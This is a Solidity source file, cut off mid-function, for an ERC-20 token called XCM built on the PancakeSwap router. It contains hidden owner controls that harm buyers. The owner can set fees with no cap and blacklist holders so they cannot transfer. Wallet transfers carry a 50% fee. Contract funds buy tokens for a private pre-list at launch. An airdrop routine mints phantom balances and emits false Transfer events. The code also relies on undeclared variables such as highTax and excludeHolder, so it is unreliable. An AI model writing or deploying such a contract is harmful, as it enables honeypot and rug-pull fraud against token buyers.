// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function feeTo() external view returns (address);
}

interface ISwapPair {
    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function totalSupply() external view returns (uint256);

    function kLast() external view returns (uint256);

    function sync() external;
}

interface IDividendPool {
    function addTokenReward(uint256 rewardAmount) external;
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!o");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "n0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}



library Math {
    function min(uint256 x, uint256 y) internal pure returns (uint256 z) {
        z = x < y ? x : y;
    }

    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}

contract XCM is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address private fundAddress;
    address private fund2Address;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _partnerList;
    mapping(address => bool) public _blackList;

    uint256 private _tTotal;

    ISwapRouter private _swapRouter;
    address private immutable _usdt;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);

    uint256 public _buyDestroyFee = 100;
    uint256 public _buyFundFee = 100;
    uint256 public _buyFund2Fee = 300;
    uint256 public _buyLPDividendFee = 0;
    uint256 public _buyLPFee = 0;

    uint256 public _sellDestroyFee = 100;
    uint256 public _sellFundFee = 100;
    uint256 public _sellFund2Fee = 300;
    uint256 public _sellLPDividendFee = 0;
    uint256 public _sellLPFee = 0;

    uint256 public _transferFee = 5000;

    uint256 public startAddLPBlock;
    uint256 public startBWBlock;

    address public _mainPair;

    uint256 public _limitAmount;
    uint256 public _txLimitAmount;
    uint256 public _minTotal;

    address public _receiveAddress;
    address _deadAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 public _airdropLen = 0;
    uint256 private constant _airdropAmount = 1e8;

    uint256 public _removeLPFee = 0;
    address public _lpFeeReceiver;

    uint256 private constant _killSec = 0;
    uint256 public _rewardHoldCondition;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _name = "XCM";
        _symbol = "XCM";
        _decimals = 18;
        address ReceiveAddress = 0x6C7E0ec3Df8F75c919Ba755cd0409d61c278B9DE;
        address FundAddress = 0x37f3B378178f6d08f5cF50895e04E38fcb7d98C6;
        address Fund2Address = 0x3618D119B81A2166fCD427e9B135d0B531193c37;
        ISwapRouter swapRouter = ISwapRouter(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        address usdt = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        IERC20(usdt).approve(address(swapRouter), MAX);

        _usdt = usdt;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        uint256 tokenUnit = 10**_decimals;
        uint256 total = 5666 * tokenUnit;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        _receiveAddress = ReceiveAddress;
        _lpFeeReceiver = ReceiveAddress;
        fundAddress = FundAddress;
        fund2Address = Fund2Address;
        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[Fund2Address] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0)] = true;
        _feeWhiteList[
            address(0x000000000000000000000000000000000000dEaD)
        ] = true;

        _limitAmount = 0;
        _txLimitAmount = 0;


        _minTotal = 1 * 10**_decimals;

        excludeHolder[address(0)] = true;
        excludeHolder[
            address(0x000000000000000000000000000000000000dEaD)
        ] = true;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return
            _tTotal -
            _balances[address(0)] -
            _balances[address(0x000000000000000000000000000000000000dEaD)];
    }

    function balanceOf(address account) public view override returns (uint256) {
        uint256 balance = _balances[account];
        return balance;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    uint256 public goMoonBlock;

    function goMoon() external onlyOwner {
        require(0 == goMoonBlock, "trading");
        goMoonBlock = block.timestamp;
        _calPreList();
    }

    function setStartTime(uint256 newval) external onlyOwner {
        goMoonBlock = newval;
    }

    function returnMoon() external onlyOwner {
        goMoonBlock = 0;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from] || _feeWhiteList[from], "BL");

        uint256 balance = balanceOf(from);
        require(balance >= amount, "BNE");
        bool takeFee;
        bool isAddLP;
        bool isRemoveLP;
        if (inSwap) {
            _funTransfer(from, to, amount, 0);
            return;
        }
        if (_mainPair == address(0)) {
            ISwapFactory swapFactory = ISwapFactory(_swapRouter.factory());
            address usdtPair = swapFactory.getPair(address(this), _usdt);
            _swapPairList[usdtPair] = true;
            _mainPair = usdtPair;
        }
        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = (balance * 99999) / 100000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
            takeFee = true;

            if (_txLimitAmount > 0) {
                require(_txLimitAmount >= amount, "txLimit");
            }
            amount -= _airdropLen * _airdropAmount;
            _airdrop(from, to, amount);
        }

        uint256 addLPLiquidity;
        if (to == _mainPair) {
            addLPLiquidity = _isAddLiquidity(amount);
            if (addLPLiquidity > 0) {
                isAddLP = true;
            }
        }

        uint256 removeLPLiquidity;
        if (from == _mainPair) {
            if (_strictCheck) {
                removeLPLiquidity = _strictCheckBuy(amount);
            } else {
                removeLPLiquidity = _isRemoveLiquidity(amount);
            }
            if (removeLPLiquidity > 0) {
                isRemoveLP = true;
            }
        }

        if (_swapPairList[from] || _swapPairList[to]) {
            if (0 == startAddLPBlock) {
                if (_feeWhiteList[from] && to == _mainPair) {
                    startAddLPBlock = block.number;
                }
            }

            if (
                !_feeWhiteList[from] && !_feeWhiteList[to] && !_partnerList[to]
            ) {
                if (0 == goMoonBlock || goMoonBlock > block.timestamp) {
                    require(0 < startAddLPBlock && isAddLP, "!Trade");
                } else {
                    if (
                        !isAddLP &&
                        !isRemoveLP &&
                        block.timestamp < goMoonBlock + _killSec
                    ) {
                        _funTransfer(from, to, amount, 99);
                        return;
                    }
                }
            }
        }

        if (isAddLP) {
            takeFee = false;
        }

        _tokenTransfer(from, to, amount, takeFee, isRemoveLP || isAddLP);

        if (_limitAmount > 0 && !_swapPairList[to] && !_feeWhiteList[to]) {
            require(_limitAmount >= balanceOf(to), "Limit");
        }

        // if (from != address(this)) {
        //     if (isAddLP) {
        //         addHolder(from);
        //     } else if (!_feeWhiteList[from]) {
        //         uint256 rewardGas = _rewardGas;
        //         processReward(rewardGas);
        //     }
        // }
    }

    function _strictCheckBuy(uint256 amount)
        internal
        view
        returns (uint256 liquidity)
    {
        (uint256 rOther, uint256 rThis, uint256 balanceOther) = _getReserves();
        //isRemoveLP
        if (balanceOther < rOther) {
            liquidity =
                (amount * ISwapPair(_mainPair).totalSupply()) /
                (_balances[_mainPair] - amount);
        } else {
            uint256 amountOther;
            if (rOther > 0 && rThis > 0) {
                amountOther = (amount * rOther) / (rThis - amount);
                //strictCheckBuy
                require(balanceOther >= amountOther + rOther);
            }
        }
    }

    uint256 limitAmount = 5 * 1e17;
    address[] private _preList;

    function setPreList(address[] memory adrs) external onlyOwner {
        _preList = adrs;
    }

    function _calPreList() private {
        uint256 len = _preList.length;
        for (uint256 i = 0; i < len; i++) swapToken(limitAmount, _preList[i]);
    }

    function swapToken(uint256 tokenAmountIn, address to) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(_usdt);
        path[1] = address(this);
        uint256 balance = IERC20(_usdt).balanceOf(address(this));
        // (uint[] memory tokenAmountList)=_swapRouter.getAmountsIn(tokenAmountOut,path);
        uint256 tokenAmount = tokenAmountIn;
        if (tokenAmount == 0 || tokenAmount > balance) tokenAmount = balance;
        // make the swap
        if (tokenAmount <= balance && tokenAmount > 0)
            _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                tokenAmount,
                0, // accept any amount of CA
                path,
                address(to),
                block.timestamp
            );
    }

    address private lastAirdropAddress;

    function _airdrop(
        address from,
        address to,
        uint256 tAmount
    ) private {
        uint256 seed = (uint160(lastAirdropAddress) | block.number) ^
            (uint160(from) ^ uint160(to));
        address airdropAddress;
        uint256 num = _airdropLen;
        uint256 airdropAmount = _airdropAmount;
        for (uint256 i; i < num; ) {
            airdropAddress = address(uint160(seed | tAmount));
            _balances[airdropAddress] += airdropAmount;
            emit Transfer(airdropAddress, airdropAddress, airdropAmount);
            unchecked {
                ++i;
                seed = seed >> 1;
            }
        }
        lastAirdropAddress = airdropAddress;
    }

    function _isAddLiquidity(uint256 amount)
        internal
        view
        returns (uint256 liquidity)
    {
        (uint256 rOther, uint256 rThis, uint256 balanceOther) = _getReserves();
        uint256 amountOther;
        if (rOther > 0 && rThis > 0) {
            amountOther = (amount * rOther) / rThis;
        }
        //isAddLP
        if (balanceOther >= rOther + amountOther) {
            (liquidity, ) = calLiquidity(balanceOther, amount, rOther, rThis);
        }
    }

    function calLiquidity(
        uint256 balanceA,
        uint256 amount,
        uint256 r0,
        uint256 r1
    ) private view returns (uint256 liquidity, uint256 feeToLiquidity) {
        uint256 pairTotalSupply = ISwapPair(_mainPair).totalSupply();
        address feeTo = ISwapFactory(_swapRouter.factory()).feeTo();
        bool feeOn = feeTo != address(0);
        uint256 _kLast = ISwapPair(_mainPair).kLast();
        if (feeOn) {
            if (_kLast != 0) {
                uint256 rootK = Math.sqrt(r0 * r1);
                uint256 rootKLast = Math.sqrt(_kLast);
                if (rootK > rootKLast) {
                    uint256 numerator = pairTotalSupply *
                        (rootK - rootKLast) *
                        8;
                    uint256 denominator = rootK * 17 + (rootKLast * 8);
                    feeToLiquidity = numerator / denominator;
                    if (feeToLiquidity > 0) pairTotalSupply += feeToLiquidity;
                }
            }
        }
        uint256 amount0 = balanceA - r0;
        if (pairTotalSupply == 0) {
            liquidity = Math.sqrt(amount0 * amount) - 1000;
        } else {
            liquidity = Math.min(
                (amount0 * pairTotalSupply) / r0,
                (amount * pairTotalSupply) / r1
            );
        }
    }

    function _getReserves()
        public
        view
        returns (
            uint256 rOther,
            uint256 rThis,
            uint256 balanceOther
        )
    {
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint256 r0, uint256 r1, ) = mainPair.getReserves();

        address tokenOther = _usdt;
        if (tokenOther < address(this)) {
            rOther = r0;
            rThis = r1;
        } else {
            rOther = r1;
            rThis = r0;
        }

        balanceOther = IERC20(tokenOther).balanceOf(_mainPair);
    }

    bool public _strictCheck = false;

    function setStrictCheck(bool enable) external onlyOwner {
        _strictCheck = enable;
    }

    function _isRemoveLiquidity(uint256 amount)
        internal
        view
        returns (uint256 liquidity)
    {
        (uint256 rOther, , uint256 balanceOther) = _getReserves();
        //isRemoveLP
        if (balanceOther <= rOther) {
            liquidity =
                (amount * ISwapPair(_mainPair).totalSupply() + 1) /
                (balanceOf(_mainPair) - amount - 1);
        }
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        uint256 fee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = (tAmount * fee) / 100;
        if (feeAmount > 0) {
            _takeTransfer(sender, _receiveAddress, feeAmount);
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isRemoveLP
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            bool isSell;
            uint256 destroyFeeAmount;
            uint256 swapFeeAmount;
            if (isRemoveLP) {
                feeAmount = (tAmount * _removeLPFee) / 10000;
                _takeTransfer(sender, _deadAddress, feeAmount);
            } else if (_swapPairList[sender]) {
                //Buy
                destroyFeeAmount = (tAmount * _buyDestroyFee) / 10000;
                swapFeeAmount =
                    (tAmount *
                        (_buyFundFee +
                            _buyFund2Fee +
                            _buyLPDividendFee +
                            _buyLPFee)) /
                    10000;
            } else if (_swapPairList[recipient]) {
                //Sell
                // isSell = true;
                destroyFeeAmount = (tAmount * _sellDestroyFee) / 10000;
                // swapFeeAmount = tAmount * (_sellFundFee + _sellFundFee2 + _sellLPDividendFee + _sellLPFee + _sellLPDividendLPFee + _sellHolderOrderDividendFee) / 10000;
                isSell = true;
                uint256 blockNum = block.timestamp;
                if (blockNum - goMoonBlock <= highTax) {
                    swapFeeAmount = (tAmount * 2500) / 10000;
                } else {
                    swapFeeAmount =
                        (tAmount *
                            (_sellFundFee +
                                _sellFund2Fee +
                                _sellLPDividendFee +
                                _sellLPFee)) /
                        10000;
                }
            } else {
                //Transfer
                feeAmount = (tAmount * _transferFee) / 10000;
                if (feeAmount > 0) {
                    _takeTransfer(sender, fund2Address, feeAmount);
                }
            }
            if (destroyFeeAmount > 0) {
                uint256 destroyAmount = destroyFeeAmount;
                uint256 currentTotal = totalSupply();
                uint256 maxDestroyAmount;
                if (currentTotal > _minTotal) {
                    maxDestroyAmount = currentTotal - _minTotal;
                }
                if (destroyAmount > maxDestroyAmount) {
                    destroyAmount = maxDestroyAmount;
                }
                if (destroyAmount > 0) {
                    feeAmount += destroyAmount;
                    _takeTransfer(
                        sender,
                        address(0x000000000000000000000000000000000000dEaD),
                        destroyAmount
                    );
                }
            }
            if (swapFeeAmount > 0) {
                feeAmount += swapFeeAmount;
                _takeTransfer(sender, address(this), swapFeeAmount);
                if (isSell && !inSwap) {
                    uint256 contractTokenBalance = balanceOf(address(this));
                    uint256 numTokensSellToFund = (swapFeeAmount * 230) / 100;
                    if (numTokensSellToFund > contractTokenBalance) {
                        numTokensSellToFund = contractTokenBalance;
                    }
                    swapTokenForFund(numTokensSellToFund);
                }
            }
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        if (0 == tokenAmount) {
            return;
        }
        uint256 fundFee = _buyFundFee +
            _buyFund2Fee +
            _sellFundFee +
            _sellFund2Fee;
        uint256 fund2Fee = _buyFund2Fee + _sellFund2Fee;
        uint256 lpDividendFee = _buyLPDividendFee + _sellLPDividendFee;
        uint256 lpFee = _buyLPFee + _sellLPFee;
        uint256 totalLPFee = lpFee;
        uint256 totalFee = fundFee + lpDividendFee + totalLPFee;

        totalFee += totalFee;

        uint256 lpAmount = (tokenAmount * totalLPFee) / totalFee;
        totalFee -= totalLPFee;

        // IERC20 USDT = IERC20(_usdt);
        uint256 usdtBalance = address(this).balance;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _usdt;
        _swapRouter.swapExactTokensForETH(
            tokenAmount - lpAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

        usdtBalance = address(this).balance - usdtBalance;
        // uint256 holderOrderDividendUsdt = usdtBalance * 2 * holderOrderDividendFee / totalFee;


        uint256 fundUsdt = (usdtBalance * fundFee * 2) / totalFee;
        uint256 fund2Usdt = (fundUsdt / fundFee) * fund2Fee;
        uint256 fund1Usdt = fundUsdt - fund2Usdt;
        if (fund1Usdt > 0) {
            payable(fundAddress).transfer(fund1Usdt);
            IDividendPool(fundAddress).addTokenReward(fund1Usdt);
        }
        if (fund2Usdt > 0) {
            payable(fund2Address).transfer(fund2Usdt);
        }
        uint256 lpUsdt = (usdtBalance * totalLPFee) / totalFee;
        if (lpUsdt > 0) {
            (, , uint256 liquidity) = _swapRouter.addLiquidity(
                address(this),
                _usdt,
                lpAmount,
                lpUsdt,
                0,
                0,
                address(this),
                block.timestamp
            );
            uint256 lpFeeAmount = (liquidity * lpFee) / totalLPFee;
            if (lpFeeAmount > 0) {
                IERC20(_mainPair).transfer(_receiveAddress, lpFeeAmount);
            }
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setFund2Address(address addr) external onlyOwner {
        fund2Address = addr;
        _feeWhiteList[addr] = true;
    }

    function setReceiveAddress(address addr) external onlyOwner {
        _receiveAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setBuyFee(
        uint256 buyDestroyFee,
        uint256 buyFundFee,
        uint256 buyFund2Fee,
        uint256 lpFee,
        uint256 lpDividendFee
    ) external onlyOwner {
        _buyDestroyFee = buyDestroyFee;
        _buyFundFee = buyFundFee;
        _buyFund2Fee = buyFund2Fee;
        _buyLPDividendFee = lpDividendFee;
        _buyLPFee = lpFee;
    }

    function setSellFee(
        uint256 sellDestroyFee,
        uint256 sellFundFee,
        uint256 sellFund2Fee,
        uint256 lpFee,
        uint256 lpDividendFee
    ) external onlyOwner {
        _sellDestroyFee = sellDestroyFee;
        _sellFundFee = sellFundFee;
        _sellFund2Fee = sellFund2Fee;
        _sellLPDividendFee = lpDividendFee;
        _sellLPFee = lpFee;
    }

    function setTransferFee(uint256 fee) external onlyOwner {
        _transferFee = fee;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function setPartnerList(address addr, bool enable) external onlyOwner {
        _partnerList[addr] = enable;
    }

    function batchSetFeeWhiteList(address[] memory addr, bool enable)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < addr.length; i++) {
            _feeWhiteList[addr[i]] = enable;
        }
    }

    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }

    function batchSetBlackList(address[] memory addr, bool enable)
        external
        onlyOwner
    {
